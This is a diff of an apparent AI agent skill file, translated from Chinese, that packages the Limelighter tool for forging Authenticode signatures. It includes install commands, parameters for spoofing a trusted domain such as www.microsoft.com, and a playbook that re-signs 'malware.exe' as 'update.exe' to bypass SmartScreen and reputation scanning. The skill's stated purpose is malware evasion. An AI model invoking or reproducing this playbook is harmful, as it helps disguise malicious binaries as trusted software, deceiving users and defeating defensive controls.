@@ -2,37 +2,41 @@
 name: limelighter-forge
 description: "Limelighter: Forge digital signatures to evade reputation scanning. Signals: malware development, evasion development, forged signatures, delay."
 zh-signals: "Limelighter: 伪造数字签名过信誉查杀。信号:恶意软件开发,免杀开发,伪造签名,延时。"
+when-to-use: >-
+  Use when forging Authenticode signatures on payloads to evade reputation and
+  SmartScreen checks; sign a binary with a spoofed trusted domain and optional
+  sleep delay.
 ---
 
 # Limelighter
 
-- 攻击大类:C45 恶意软件开发与免杀
-- 上游仓库:https://github.com/Tylous/Limelighter
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C45 Malware Development and AV Evasion
+- Upstream Repository: https://github.com/Tylous/Limelighter
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/Tylous/Limelighter && cd Limelighter && go build
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./Limelighter -I payload.exe -O signed.exe` | 伪造签名 |
-| `-I bin -O out -Domain www.microsoft.com` | 域名 |
-| `-Sleep 5` | 延时 |
+| `./Limelighter -I payload.exe -O signed.exe` | Forge a signature |
+| `-I bin -O out -Domain www.microsoft.com` | Domain |
+| `-Sleep 5` | Delay |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 伪造数字签名过信誉查杀
+### Forging digital signatures to evade reputation scanning
 
 ```bash
 ./Limelighter -I malware.exe -O update.exe
-# 可信签名绕过 SmartScreen
+# A trusted signature bypasses SmartScreen
 ```
 
-## 注意事项
+## Notes
 
-Tylous 出品,伪造 Authenticode 签名。
+From Tylous; forges Authenticode signatures.
